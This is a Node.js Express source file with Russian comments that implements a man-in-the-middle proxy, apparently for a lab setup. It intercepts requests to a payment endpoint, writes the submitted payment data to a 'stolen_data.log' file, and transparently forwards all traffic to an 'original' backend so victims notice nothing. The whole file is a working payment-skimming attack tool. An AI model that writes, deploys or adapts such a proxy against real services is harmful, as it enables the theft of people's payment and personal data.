import express from "express";
import httpProxy from 'http-proxy';
import fs from 'fs';
import { fileURLToPath } from "url";
import path from "path";
import http from 'http';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = 8081;
const proxy = httpProxy.createProxyServer({});

// Папка для логов
const logDir = path.join(__dirname, 'logs');
if (!fs.existsSync(logDir)) {
    fs.mkdirSync(logDir, { recursive: true });
}

function logStolen(data, source = 'unknown') {
    const logEntry = {
        timestamp: new Date().toISOString(),
        source,
        data
    };
    console.log("🚨 ПЕРЕХВАЧЕНЫ ДАННЫЕ:", logEntry);
    fs.appendFileSync(path.join(logDir, 'stolen_data.log'), JSON.stringify(logEntry) + '\n');
}

// Перехватываем POST /api/payment
app.post('/api/payment', (req, res) => {
    let body = '';
    let alreadySent = false; // 🔒 защита от двойного res.send

    req.on('data', (chunk) => {
        body += chunk.toString();
    });

    req.on('end', () => {
        if (alreadySent) return;
        try {
            const data = JSON.parse(body);
            logStolen(data, 'payment_form');

            // Пробрасываем запрос на original
            const proxyReq = http.request(
                {
                    hostname: 'original',
                    port: 8080,
                    path: '/api/payment',
                    method: 'POST',
                    headers: {
                        ...req.headers,
                        'content-length': Buffer.byteLength(body)
                    }                },
                (proxyRes) => {
                    // Пробрасываем статус и заголовки
                    res.writeHead(proxyRes.statusCode, proxyRes.headers);
                    proxyRes.pipe(res);
                }
            );

            // Отправляем тело
            proxyReq.write(body);
            proxyReq.end();

        } catch (err) {
            if (!alreadySent) {
                console.error('Ошибка парсинга тела:', err);
                res.status(500).json({ error: 'Invalid JSON' });
                alreadySent = true;
            }
        }
    });

    req.on('error', (err) => {
        if (!alreadySent) {
            console.error('Ошибка чтения тела запроса:', err);
            res.status(500).send('Request error');
            alreadySent = true;
        }
    });

    // Защита от зависания
    req.on('aborted', () => {
        if (!alreadySent) {
            alreadySent = true;
        }
    });
});

// Всё остальное — проксируем
app.use((req, res) => {
    console.log(`MITM: Прокси ${req.method} ${req.url}`);
    proxy.web(req, res, { target: 'http://original:8080' }, (err) => {
        if (!res.headersSent) {
            console.error('Прокси ошибка:', err.message);
            res.status(500).send('Proxy error');
        }
    });
});

// Обработка ошибок прокси
proxy.on('error', (err, req, res) => {
    console.log('Прокси ошибка - ', err.message);
    if (!res.headersSent) {
        res.status(500).send('Server error');
    }
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`MITM-сервер — http://localhost:8081`)
})